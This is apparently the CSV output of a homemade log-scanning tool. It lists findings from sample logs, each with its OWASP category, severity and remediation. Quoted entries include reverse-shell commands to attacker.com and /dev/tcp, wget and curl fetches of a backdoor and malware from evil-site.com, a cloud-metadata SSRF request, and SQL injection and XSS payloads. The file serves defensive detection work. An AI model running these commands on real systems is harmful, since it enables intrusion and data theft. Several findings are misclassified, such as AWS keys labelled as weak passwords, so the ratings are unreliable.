Keyword,Severity,Confidence,OWASP,CVSS,Remediation,File,Line,Content
ip_address,LOW,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,9,SSRF request to http://169.254.169.254/latest/meta-data
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,3,ERROR SQL injection attempt detected: ' OR 1=1 --
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,5,WARN admin token exposed: ghp_exampletoken
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,10,admin password is secret
password_assignment,HIGH,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,11,password=12345
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,12,INFO AWS key found: AKIA1234567890ABCDE
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,13,AWS key leaked: AKIA1234567890ABCDEF
github_token,HIGH,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,17,GitHub token leaked: ghp_abcdefghijklmnoprstuvwxyz123
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,18,WARN Login attempt username=admin' OR 1=1 --
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,19,WARN SQL attack detected: UNION SELECT password FROM users
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,21,WARN BODY exploit: <body onload=alert('xss')>
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,22,WARN Weak_password detected: password123
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,23,WARN Admin login using admin123
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,24,WARN Admin endpoint accessed: /admin/dashboard
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,27,WARN Shell execution detection: os.system(cmd)
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,31,WARN wget http://evil-site.com/backdoor.sh
reverse_shell,HIGH,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,32,WARN nc -e /bin/sh attacker.com 4444
os_system_usage,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,33,"WARN Shell execution detected: os.system(""rm -rf"")"
admin_endpoint,HIGH,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,36,WARN admin_access attempt to /admin/users
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,37,ERROR XSS payload: javascript:alert('owned')
weak_password,HIGH,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,38,ERROR User account using qwerty password
default_credentials,HIGH,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,40,ERROR Default credentials detected admin:admin
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,41,ERROR Possible login bypass attempt: ' OR 1=1 --
pickle_loads,HIGH,MEDIUM,A08: Software and Data Integrity Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,42,ERROR Unsafe deserialization: pickle.loads(user_data)
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,43,ERROR SQL injection attempt detected: ' OR 1=1 --
sql_injection_payload,HIGH,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,45,ERROR sql_injection_payload detected: ' OR 1=1 --
eval_usage,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,46,CRITICAL Dangerous eval detected: eval(user_input)
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,47,ALERT powershell.exe -ExecutionPolicy Bypass
download_activity,HIGH,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,48,ALERT curl http://evil-site.com/malware.exe
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,50,ALERT github_token found in config
powershell,HIGH,HIGH,A05: Security Misconfiguration,9.5,Review command and restrict execution policy.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,51,ALERT powershell execution detection
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,6,ERROR XSS payload: <script>alert(1)</script>
hardcore_login,MEDIUM,MEDIUM,A07: Identification and Authentication Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,15,"INFO username=""test_user"""
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,20,WARN IMG exploit: <img src=x onerror=alert(1)>
debug_endpoint,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,25,WARN Debug endpoint exposed: /debug/config
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,34,WARN User attempt access to admin_panel
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,35,WARN Unauthorized access to admin_panel
xss,MEDIUM,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,44,ERROR XSS payload: <script>alert(1)</script>
ip_address,LOW,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,1,INFO User login success user=alice ip=10.0.0.5
ip_address,LOW,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,2,WARN Failed password attempt user=bob ip=10.0.0.9
email,LOW,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,8,INFO Contact admin@test.com immediately
api_endpoint,LOW,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,9,INFO Request made to /api/users/profile
ip_address,LOW,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,14,INFO Suspicious login from 192.168.1.25
ip_address,LOW,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,49,ALERT bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
